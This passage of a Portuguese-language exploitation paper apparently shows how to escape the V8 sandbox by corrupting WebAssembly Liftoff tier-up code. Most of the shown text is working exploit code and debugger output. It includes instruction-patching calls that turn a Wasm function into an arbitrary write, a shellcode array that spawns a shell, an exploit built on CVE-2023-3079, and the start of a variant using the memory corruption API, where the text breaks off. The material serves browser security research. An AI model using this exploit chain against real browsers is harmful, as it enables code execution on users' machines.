class="sourceCode cpp"><code class="sourceCode cpp"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="co">// https://source.chromium.org/chromium/chromium/src/+/main:v8/src/codegen/x64/macro-assembler-x64.cc;l=449-457;drc=8de6dcc377690a0ea0fd95ba6bbef802f55da683</span></span>
<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> MacroAssembler<span class="op">::</span>DecodeSandboxedPointer<span class="op">(</span>Register value<span class="op">)</span> <span class="op">{</span></span>
<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>  ASM_CODE_COMMENT<span class="op">(</span><span class="kw">this</span><span class="op">);</span></span>
<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#ifdef V8_ENABLE_SANDBOX</span></span>
<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a><span class="co">// [4]</span></span>
<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>  shrq<span class="op">(</span>value<span class="op">,</span> Immediate<span class="op">(</span>kSandboxedPointerShift<span class="op">));</span></span>
<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>  addq<span class="op">(</span>value<span class="op">,</span> kPtrComprCageBaseRegister<span class="op">);</span></span>
<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a><span class="pp">#else</span></span>
<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a>  UNREACHABLE<span class="op">();</span></span>
<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a><span class="pp">#endif</span></span>
<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
<p>No primeiro acesso (<code>[1]</code>), quem gerou esse assembly foi a
função <code>CheckTierUp</code> (<code>[3]</code>), que pega esse
endereço com <code>Operand{instance, kArrayOffset}</code>, que é
compilado para <code>mov r10, [instance+kArrayOffset]</code>, enquanto
no segundo trecho de código (<code>[2]</code>), quem gerou esse acesso
foi a função <code>DecodeSandboxedPointer</code>, fazendo o
<em>shift</em> e <em>add</em> corretos (<code>[4]</code>). Ou seja,
estamos simplesmente confiando em um ponteiro de dentro da sandbox e
subtraindo <code>budget_used</code>.</p>
<p>Se você se lembrar que as paginas de WebAssembly são RWX você pode
perceber algo interessante: Temos um CTF de shellcoding!</p>
<p>Se escrevemos no endereço <code>[rsi+0x77]</code> o endereço da
instrução <code>shr rcx, 24</code>, podemos subtrair 0x18 de algum lugar
do opcode, vamos ver quais instruções podemos criar com isso:</p>
<div class="sourceCode" id="cb9"><pre
class="sourceCode bash"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="ex">r3tr0@pwn:~$</span> rasm2 <span class="at">-d</span> 48c1e918</span>
<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a><span class="ex">shr</span> rcx, 0x18</span>
<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="ex">r3tr0@pwn:~$</span> rasm2 <span class="at">-d</span> 30c1e918 <span class="co"># 0x48-0x18=0x30</span></span>
<span id="cb9-4"><a href="#cb9-4" aria-hidden="true" tabindex="-1"></a><span class="ex">xor</span> cl, al</span>
<span id="cb9-5"><a href="#cb9-5" aria-hidden="true" tabindex="-1"></a><span class="ex">invalid</span></span>
<span id="cb9-6"><a href="#cb9-6" aria-hidden="true" tabindex="-1"></a><span class="ex">invalid</span></span>
<span id="cb9-7"><a href="#cb9-7" aria-hidden="true" tabindex="-1"></a><span class="ex">r3tr0@pwn:~$</span> rasm2 <span class="at">-d</span> 48a9e918 <span class="co"># 0xc1-0x18=0xa9</span></span>
<span id="cb9-8"><a href="#cb9-8" aria-hidden="true" tabindex="-1"></a><span class="ex">invalid</span></span>
<span id="cb9-9"><a href="#cb9-9" aria-hidden="true" tabindex="-1"></a><span class="ex">invalid</span></span>
<span id="cb9-10"><a href="#cb9-10" aria-hidden="true" tabindex="-1"></a><span class="ex">invalid</span></span>
<span id="cb9-11"><a href="#cb9-11" aria-hidden="true" tabindex="-1"></a><span class="ex">invalid</span></span>
<span id="cb9-12"><a href="#cb9-12" aria-hidden="true" tabindex="-1"></a><span class="ex">r3tr0@pwn:~$</span> rasm2 <span class="at">-d</span> 48c1d118 <span class="co"># 0xe9-0x18=0xd1</span></span>
<span id="cb9-13"><a href="#cb9-13" aria-hidden="true" tabindex="-1"></a><span class="ex">rcl</span> rcx, 0x18</span></code></pre></div>
<p>Ótimo! Achamos algo muito útil! Conseguimos trocar a instrução
<code>shr rcx, 0x18</code> por <code>rcl rcx, 0x18</code>, essa
instrução apenas faz “Rotate” do valor. Isso parece o suficiente para
ignorar o shift e utilizar endereços de 64 bits, dessa forma, podemos
simplesmente usar essa função como “write any where” e copiar um
shellcode para alguma função Wasm.</p>
<h1 id="exploits">Exploits</h1>
<p>Vamos testar nossa teoria! Podemos fazer de duas formas, usar algum
CVE recente ou as API’s de corrupção de memória (é estranho que isso
exista, mas a sua função é exatamente testar coisas como a sandbox),
podemos ativar ela com a flag
<code>v8_expose_memory_corruption_api=true</code> no arquivo
<code>args.gn</code>. Nesse paper vamos testar as duas formas.</p>
<h2 id="cve-2023-3079">CVE-2023-3079</h2>
<blockquote>
<p>Exploit baseado em: <a
href="https://github.com/mistymntncop/CVE-2023-3079">https://github.com/mistymntncop/CVE-2023-3079</a></p>
</blockquote>
<p>Essa é uma falha onde vazamos o <strong>TheHole</strong> e forçamos
um <em>type confusion</em>, não irei me aprofundar, pois não é o
objetivo deste paper, mas se quiser ver de forma mais detalhada sobre o
bug, leia o exploit original <a
href="https://github.com/mistymntncop/CVE-2023-3079/blob/main/exploit.js">aqui</a>.</p>
<p>Vamos repetir o mesmo processo e ver o código gerado:</p>
<pre class="wasm"><code>(module
  (func $nop (export &quot;nop&quot;)
    nop
  )
)</code></pre>
<div class="sourceCode" id="cb11"><pre
class="sourceCode nasm"><code class="sourceCode nasm"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a>--- WebAssembly code <span class="op">---</span></span>
<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a><span class="fu">name:</span> wasm<span class="op">-</span>function<span class="op">[</span><span class="dv">0</span><span class="op">]</span></span>
<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a><span class="fu">index:</span> 0</span>
<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a><span class="fu">kind:</span> wasm function</span>
<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a><span class="fu">compiler:</span> Liftoff</span>
<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>Body <span class="op">(</span>size <span class="op">=</span> <span class="dv">128</span> <span class="op">=</span> <span class="dv">88</span> <span class="op">+</span> <span class="dv">40</span> padding<span class="op">)</span></span>
<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a>Instructions <span class="op">(</span>size <span class="op">=</span> <span class="dv">76</span><span class="op">)</span></span>
<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a>0x1c6675a9740     0  55                   <span class="kw">push</span> <span class="kw">rbp</span></span>
<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a>0x1c6675a9741     1  4889e5               REX<span class="op">.</span>W movq <span class="kw">rbp</span><span class="op">,</span><span class="kw">rsp</span></span>
<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a>0x1c6675a9744     4  6a08                 <span class="kw">push</span> <span class="bn">0x8</span></span>
<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a>0x1c6675a9746     6  56                   <span class="kw">push</span> <span class="kw">rsi</span></span>
<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a>0x1c6675a9747     7  4881ec10000000       REX<span class="op">.</span>W subq <span class="kw">rsp</span><span class="op">,</span><span class="bn">0x10</span></span>
<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a>0x1c6675a974e     e  <span class="dv">488</span><span class="er">b462f</span>             REX<span class="op">.</span>W movq <span class="kw">rax</span><span class="op">,[</span><span class="kw">rsi</span><span class="op">+</span><span class="bn">0x2f</span><span class="op">]</span></span>
<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a>0x1c6675a9752    12  483b20               REX<span class="op">.</span>W cmpq <span class="kw">rsp</span><span class="op">,[</span><span class="kw">rax</span><span class="op">]</span></span>
<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a>0x1c6675a9755    15  0f8619000000         <span class="cf">jna</span> <span class="bn">0x1c6675a9774</span>  <span class="op">&lt;+</span><span class="bn">0x34</span><span class="op">&gt;</span></span>
<span id="cb11-16"><a href="#cb11-16" aria-hidden="true" tabindex="-1"></a>0x1c6675a975b    1b  488b868f000000       REX<span class="op">.</span>W movq <span class="kw">rax</span><span class="op">,[</span><span class="kw">rsi</span><span class="op">+</span><span class="bn">0x8f</span><span class="op">]</span></span>
<span id="cb11-17"><a href="#cb11-17" aria-hidden="true" tabindex="-1"></a>0x1c6675a9762    22  8b08                 movl <span class="kw">rcx</span><span class="op">,[</span><span class="kw">rax</span><span class="op">]</span></span>
<span id="cb11-18"><a href="#cb11-18" aria-hidden="true" tabindex="-1"></a>0x1c6675a9764    24  83e91b               subl <span class="kw">rcx</span><span class="op">,</span><span class="bn">0x1b</span></span>
<span id="cb11-19"><a href="#cb11-19" aria-hidden="true" tabindex="-1"></a>0x1c6675a9767    27  0f8812000000         <span class="cf">js</span> <span class="bn">0x1c6675a977f</span>  <span class="op">&lt;+</span><span class="bn">0x3f</span><span class="op">&gt;</span></span>
<span id="cb11-20"><a href="#cb11-20" aria-hidden="true" tabindex="-1"></a>0x1c6675a976d    2d  8908                 movl <span class="op">[</span><span class="kw">rax</span><span class="op">],</span><span class="kw">rcx</span></span>
<span id="cb11-21"><a href="#cb11-21" aria-hidden="true" tabindex="-1"></a>0x1c6675a976f    2f  488be5               REX<span class="op">.</span>W movq <span class="kw">rsp</span><span class="op">,</span><span class="kw">rbp</span></span>
<span id="cb11-22"><a href="#cb11-22" aria-hidden="true" tabindex="-1"></a>0x1c6675a9772    32  5d                   <span class="kw">pop</span> <span class="kw">rbp</span></span>
<span id="cb11-23"><a href="#cb11-23" aria-hidden="true" tabindex="-1"></a>0x1c6675a9773    33  c3                   retl</span>
<span id="cb11-24"><a href="#cb11-24" aria-hidden="true" tabindex="-1"></a>0x1c6675a9774    34  e867fbffff           call <span class="bn">0x1c6675a92e0</span>  <span class="op">(</span>jump table<span class="op">)</span></span>
<span id="cb11-25"><a href="#cb11-25" aria-hidden="true" tabindex="-1"></a>0x1c6675a9779    39  488b75f0             REX<span class="op">.</span>W movq <span class="kw">rsi</span><span class="op">,[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x10</span><span class="op">]</span></span>
<span id="cb11-26"><a href="#cb11-26" aria-hidden="true" tabindex="-1"></a>0x1c6675a977d    3d  ebdc                 jmp <span class="bn">0x1c6675a975b</span>  <span class="op">&lt;+</span><span class="bn">0x1b</span><span class="op">&gt;</span></span>
<span id="cb11-27"><a href="#cb11-27" aria-hidden="true" tabindex="-1"></a>0x1c6675a977f    3f  e8dcf9ffff           call <span class="bn">0x1c6675a9160</span>  <span class="op">(</span>jump table<span class="op">)</span></span>
<span id="cb11-28"><a href="#cb11-28" aria-hidden="true" tabindex="-1"></a>0x1c6675a9784    44  488b75f0             REX<span class="op">.</span>W movq <span class="kw">rsi</span><span class="op">,[</span><span class="kw">rbp</span><span class="op">-</span><span class="bn">0x10</span><span class="op">]</span></span>
<span id="cb11-29"><a href="#cb11-29" aria-hidden="true" tabindex="-1"></a>0x1c6675a9788    48  ebe5                 jmp <span class="bn">0x1c6675a976f</span>  <span class="op">&lt;+</span><span class="bn">0x2f</span><span class="op">&gt;</span></span>
<span id="cb11-30"><a href="#cb11-30" aria-hidden="true" tabindex="-1"></a>0x1c6675a978a    4a  6690                 <span class="kw">nop</span></span>
<span id="cb11-31"><a href="#cb11-31" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-32"><a href="#cb11-32" aria-hidden="true" tabindex="-1"></a>Source positions<span class="op">:</span></span>
<span id="cb11-33"><a href="#cb11-33" aria-hidden="true" tabindex="-1"></a> pc offset  position</span>
<span id="cb11-34"><a href="#cb11-34" aria-hidden="true" tabindex="-1"></a>        34         0  statement</span>
<span id="cb11-35"><a href="#cb11-35" aria-hidden="true" tabindex="-1"></a>        3f         2  statement</span>
<span id="cb11-36"><a href="#cb11-36" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-37"><a href="#cb11-37" aria-hidden="true" tabindex="-1"></a>Safepoints <span class="op">(</span>entries <span class="op">=</span> <span class="dv">1</span><span class="op">,</span> <span class="dt">byte</span> size <span class="op">=</span> <span class="dv">10</span><span class="op">)</span></span>
<span id="cb11-38"><a href="#cb11-38" aria-hidden="true" tabindex="-1"></a>0x1c6675a9779     39  slots <span class="op">(</span><span class="kw">sp</span><span class="op">-&gt;</span>fp<span class="op">):</span> <span class="dv">00000000</span></span>
<span id="cb11-39"><a href="#cb11-39" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-40"><a href="#cb11-40" aria-hidden="true" tabindex="-1"></a>RelocInfo <span class="op">(</span>size <span class="op">=</span> <span class="dv">0</span><span class="op">)</span></span>
<span id="cb11-41"><a href="#cb11-41" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb11-42"><a href="#cb11-42" aria-hidden="true" tabindex="-1"></a>--- End code <span class="op">---</span></span></code></pre></div>
<p>Durante os testes eu não consegui achar uma forma de usar o valor
<code>0x1b</code> para criar outros opcodes uteis, então tive uma outra
ideia, o valor do <code>subl</code> muda dependendo da versão do v8 e
das interações que o código tem com a <em>stack</em>. O objetivo será
gerar duas funcões de “nop”, uma com o <code>budget_used</code> maior
que o outro, e usar a primeira função para subtrair da segunda o valor
do seu <code>subl</code>, exemplificando melhor:</p>
<pre class="wasm"><code>(module
  (memory 1)
  (func $nop (export &quot;nop&quot;)
    i32.const 1
    i32.const 0xdead
    i32.store
  )

  (func (export &quot;nop2&quot;)
    nop
    i32.const 0
    i32.const 0xdead
    i32.store
    i32.const 1
    i32.const 0xdead
    i32.store
  )
)</code></pre>
<div class="sourceCode" id="cb13"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a>V8 version <span class="fl">11.4.0</span> (candidate)</span>
<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>d8<span class="op">&gt;</span> <span class="fu">nop</span>()</span>
<span id="cb13-3"><a href="#cb13-3" aria-hidden="true" tabindex="-1"></a>[truncated]</span>
<span id="cb13-4"><a href="#cb13-4" aria-hidden="true" tabindex="-1"></a><span class="bn">0x1a787102975b</span>    <span class="dv">1</span><span class="er">b</span>  <span class="dv">488</span><span class="er">b868f000000</span>       REX<span class="op">.</span><span class="at">W</span> movq rax<span class="op">,</span>[rsi<span class="op">+</span><span class="bn">0x8f</span>]</span>
<span id="cb13-5"><a href="#cb13-5" aria-hidden="true" tabindex="-1"></a><span class="bn">0x1a7871029762</span>    <span class="dv">22</span>  <span class="dv">8</span><span class="er">b08</span>                 movl rcx<span class="op">,</span>[rax]</span>
<span id="cb13-6"><a href="#cb13-6" aria-hidden="true" tabindex="-1"></a><span class="bn">0x1a7871029764</span>    <span class="dv">24</span>  <span class="fl">83e91</span>b               subl rcx<span class="op">,</span><span class="bn">0x1b</span></span>
<span id="cb13-7"><a href="#cb13-7" aria-hidden="true" tabindex="-1"></a>[truncated]</span>
<span id="cb13-8"><a href="#cb13-8" aria-hidden="true" tabindex="-1"></a>d8<span class="op">&gt;</span> <span class="fu">nop2</span>()</span>
<span id="cb13-9"><a href="#cb13-9" aria-hidden="true" tabindex="-1"></a>[truncated]</span>
<span id="cb13-10"><a href="#cb13-10" aria-hidden="true" tabindex="-1"></a><span class="bn">0x1a78710297f5</span>    <span class="dv">35</span>  <span class="dv">488</span><span class="er">b868f000000</span>       REX<span class="op">.</span><span class="at">W</span> movq rax<span class="op">,</span>[rsi<span class="op">+</span><span class="bn">0x8f</span>]</span>
<span id="cb13-11"><a href="#cb13-11" aria-hidden="true" tabindex="-1"></a><span class="bn">0x1a78710297fc</span>    <span class="dv">3</span><span class="er">c</span>  <span class="dv">8</span><span class="er">b5008</span>               movl rdx<span class="op">,</span>[rax<span class="op">+</span><span class="bn">0x8</span>]</span>
<span id="cb13-12"><a href="#cb13-12" aria-hidden="true" tabindex="-1"></a><span class="bn">0x1a78710297ff</span>    <span class="dv">3</span><span class="er">f</span>  <span class="dv">83</span><span class="er">ea35</span>               subl rdx<span class="op">,</span><span class="bn">0x35</span></span>
<span id="cb13-13"><a href="#cb13-13" aria-hidden="true" tabindex="-1"></a>[truncated]</span></code></pre></div>
<p>E no exploit vamos subtrair <code>0x1b</code> de
<code>0x35</code>:</p>
<div class="sourceCode" id="cb14"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="fu">v8_write64</span>(wasm_instance_addr <span class="op">+</span> tiering_budget_array_off<span class="op">,</span> sub_instruction_addr)<span class="op">;</span></span>
<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="fu">nop</span>()<span class="op">;</span> <span class="co">// transform &quot;subl rdx,0x35&quot; in &quot;subl rdi,0x7&quot;</span></span></code></pre></div>
<p>E depois disso, podemos subtrair valores de forma mais assertiva,
vamos criar outras duas funções no WebAssembly, <code>arb_write</code> e
<code>shell</code>, a primeira será a função que vamos retirar os checks
de integridade e a segunda um “nop” para onde vamos copiar nosso
shellcode:</p>
<pre class="wasm"><code>(func $main (export &quot;arb_write&quot;)
  (param $offset i32)  ;; Offset within memory
  (param $value i64)   ;; 64-bit integer to write
  
  (i64.store
    (local.get $offset)  ;; Get the memory offset
    (local.get $value)   ;; Get the i64 value
  )
)
(func (export &quot;shell&quot;)
  nop
)</code></pre>
<p>Agora com nosso <code>subl [arb address],0x7</code> vamos trocar
algumas instruções de <code>arb_write</code>:</p>
<div class="sourceCode" id="cb16"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="fu">v8_write64</span>(wasm_instance_addr <span class="op">+</span> tiering_budget_array_off<span class="op">,</span> shr_instruction_addr <span class="op">-</span> <span class="dv">4</span>n)<span class="op">;</span></span>
<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="fu">nop2</span>()<span class="op">;</span> <span class="co">// transform &quot;shrq rcx, 24&quot; in &quot;shr r9d, 0x18&quot;</span></span>
<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a><span class="fu">v8_write64</span>(wasm_instance_addr <span class="op">+</span> tiering_budget_array_off<span class="op">,</span> add_instruction_addr <span class="op">-</span> <span class="dv">4</span>n)<span class="op">;</span></span>
<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a><span class="fu">nop2</span>()<span class="op">;</span> <span class="co">// transform &quot;addq rcx,r14&quot; in &quot;add ecx, esi&quot;</span></span>
<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a><span class="fu">v8_write64</span>(wasm_instance_addr <span class="op">+</span> tiering_budget_array_off<span class="op">,</span> add_instruction_addr <span class="op">-</span> <span class="dv">4</span>n <span class="op">+</span> <span class="dv">2</span>n)<span class="op">;</span></span>
<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a><span class="fu">nop2</span>()<span class="op">;</span> <span class="co">// transform &quot;add ecx, esi&quot; in &quot;add eax,edi&quot;</span></span>
<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a><span class="fu">v8_write64</span>(wasm_instance_addr <span class="op">+</span> tiering_budget_array_off<span class="op">,</span> add_instruction_addr <span class="op">-</span> <span class="dv">4</span>n <span class="op">+</span> <span class="dv">2</span>n)<span class="op">;</span></span>
<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a><span class="fu">nop2</span>()<span class="op">;</span> <span class="co">// transform &quot;add eax,edi&quot; in &quot;add eax, eax&quot;</span></span>
<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a><span class="fu">v8_write64</span>(wasm_instance_addr <span class="op">+</span> tiering_budget_array_off<span class="op">,</span> orig_sub_addr)<span class="op">;</span></span></code></pre></div>
<p>Trocamos as instruções <code>shrq rcx, 24</code> por
<code>shr r9d, 0x18</code> e <code>addq rcx, r14</code> por
<code>add eax, eax</code>, uma comparação de antes/depois:</p>
<div class="sourceCode" id="cb17"><pre
class="sourceCode nasm"><code class="sourceCode nasm"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a>V8 version <span class="fl">11.4</span><span class="fu">.0</span> <span class="op">(</span>candidate<span class="op">)</span></span>
<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>d8<span class="op">&gt;</span> arb_write<span class="op">(</span><span class="dv">0</span><span class="op">,</span> <span class="dv">10</span><span class="er">n</span><span class="op">)</span>      </span>
<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>[truncated<span class="op">]</span></span>
<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a>0x1d26426fd81b    1b  488b4e1f             REX<span class="op">.</span>W movq <span class="kw">rcx</span><span class="op">,[</span><span class="kw">rsi</span><span class="op">+</span><span class="bn">0x1f</span><span class="op">]</span></span>
<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a>0x1d26426fd81f    1f  48c1e918             REX<span class="op">.</span>W shrq <span class="kw">rcx</span><span class="op">,</span> <span class="dv">24</span></span>
<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a>0x1d26426fd823    23  4903ce               REX<span class="op">.</span>W addq <span class="kw">rcx</span><span class="op">,</span><span class="kw">r14</span></span>
<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a>0x1d26426fd826    26  48891401             REX<span class="op">.</span>W movq <span class="op">[</span><span class="kw">rcx</span><span class="op">+</span><span class="kw">rax</span><span class="op">*</span><span class="dv">1</span><span class="op">],</span><span class="kw">rdx</span></span>
<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a>0x1d26426fd82a    2a  488b9e8f000000       REX<span class="op">.</span>W movq <span class="kw">rbx</span><span class="op">,[</span><span class="kw">rsi</span><span class="op">+</span><span class="bn">0x8f</span><span class="op">]</span></span>
<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a>0x1d26426fd831    31  8b7b08               movl <span class="kw">rdi</span><span class="op">,[</span><span class="kw">rbx</span><span class="op">+</span><span class="bn">0x8</span><span class="op">]</span></span>
<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a>0x1d26426fd834    34  83ef2a               subl <span class="kw">rdi</span><span class="op">,</span><span class="bn">0x2a</span></span>
<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a>[truncated<span class="op">]</span></span></code></pre></div>
<div class="sourceCode" id="cb18"><pre
class="sourceCode nasm"><code class="sourceCode nasm"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a>pwndbg<span class="op">&gt;</span> x<span class="op">/</span><span class="dv">10</span><span class="er">i</span> <span class="bn">0x1d26426fd81b</span></span>
<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a>   0x1d26426fd81b:  <span class="kw">mov</span>    <span class="kw">rcx</span><span class="op">,</span><span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rsi</span><span class="op">+</span><span class="bn">0x1f</span><span class="op">]</span></span>
<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a>   0x1d26426fd81f:  <span class="kw">shr</span>    <span class="kw">r9d</span><span class="op">,</span><span class="bn">0x18</span></span>
<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a>   0x1d26426fd823:  rex<span class="op">.</span>X  add <span class="kw">eax</span><span class="op">,</span><span class="kw">eax</span></span>
<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a>   0x1d26426fd826:  <span class="kw">mov</span>    <span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rcx</span><span class="op">+</span><span class="kw">rax</span><span class="op">*</span><span class="dv">1</span><span class="op">],</span><span class="kw">rdx</span></span>
<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a>   0x1d26426fd82a:  <span class="kw">mov</span>    <span class="kw">rbx</span><span class="op">,</span><span class="dt">QWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rsi</span><span class="op">+</span><span class="bn">0x8f</span><span class="op">]</span></span>
<span id="cb18-7"><a href="#cb18-7" aria-hidden="true" tabindex="-1"></a>   0x1d26426fd831:  <span class="kw">mov</span>    <span class="kw">edi</span><span class="op">,</span><span class="dt">DWORD</span> <span class="dt">PTR</span> <span class="op">[</span><span class="kw">rbx</span><span class="op">+</span><span class="bn">0x8</span><span class="op">]</span></span>
<span id="cb18-8"><a href="#cb18-8" aria-hidden="true" tabindex="-1"></a>   0x1d26426fd834:  <span class="kw">sub</span>    <span class="kw">edi</span><span class="op">,</span><span class="bn">0x2a</span></span>
<span id="cb18-9"><a href="#cb18-9" aria-hidden="true" tabindex="-1"></a>[truncated<span class="op">]</span></span></code></pre></div>
<p>Perfeito! Finalmente podemos simplesmente copiar nosso shellcode e
executar shell:</p>
<div class="sourceCode" id="cb19"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> shellcode <span class="op">=</span> [</span>
<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a>  <span class="bn">0x732f6e69622fb848</span>n<span class="op">,</span> <span class="bn">0x66525f5450990068</span>n<span class="op">,</span> <span class="bn">0x5e8525e54632d68</span>n<span class="op">,</span> <span class="bn">0x68736162000000</span>n<span class="op">,</span> <span class="bn">0xf583b6a5e545756</span>n<span class="op">,</span> <span class="bn">0x5</span>n</span>
<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a>]<span class="op">;</span></span>
<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;[+] Copying shellcode&quot;</span>)</span>
<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a><span class="fu">v8_write64</span>(wasm_instance_addr <span class="op">+</span> <span class="bn">0x1f</span>n<span class="op">,</span> shellcode_addr)<span class="op">;</span></span>
<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a>shellcode<span class="op">.</span><span class="fu">map</span>((code<span class="op">,</span> i) <span class="kw">=&gt;</span> {</span>
<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a>  <span class="fu">arb_write</span>(i <span class="op">*</span> <span class="dv">4</span><span class="op">,</span> code)<span class="op">;</span></span>
<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a>})</span>
<span id="cb19-10"><a href="#cb19-10" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb19-11"><a href="#cb19-11" aria-hidden="true" tabindex="-1"></a><span class="bu">console</span><span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;[+] Poping shell!!!&quot;</span>)</span>
<span id="cb19-12"><a href="#cb19-12" aria-hidden="true" tabindex="-1"></a><span class="fu">shell</span>()<span class="op">;</span></span></code></pre></div>
<figure>
<img
src="/assets/imgs/abusing-liftoff-assembly/poping-shell-cve-2023-3079.png"
alt="poping-shell-cve-2023-3079.png" />
<figcaption
aria-hidden="true">poping-shell-cve-2023-3079.png</figcaption>
</figure>
<p><a
href="https://github.com/R3tr074/exploits/blob/master/browser/v8/cve-2023-3079/exploit.js">Final
exploit</a></p>
<h2 id="memory-corruption-api">Memory corruption API</h2>
<p>Para adaptar o exploit usando a memory corruption API não é muito
complexo, podemos criar as seguintes funções para simular uma exploração
bem sucedida dentro da v8 sandbox:</p>
<div class="sourceCode" id="cb20"><pre
class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="kw">let</span> sandboxMemory <span class="op">=</span> <span class="kw">new</span> <span class="bu">DataView</span>(<span class="kw">new</span> Sandbox<span class="op">.</span><span class="fu">MemoryView</span>(<span class="dv">0</span><span class="op">,</span> <span class="bn">0x100000000</span>))<span class="op">;</span></span>
<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a></span>
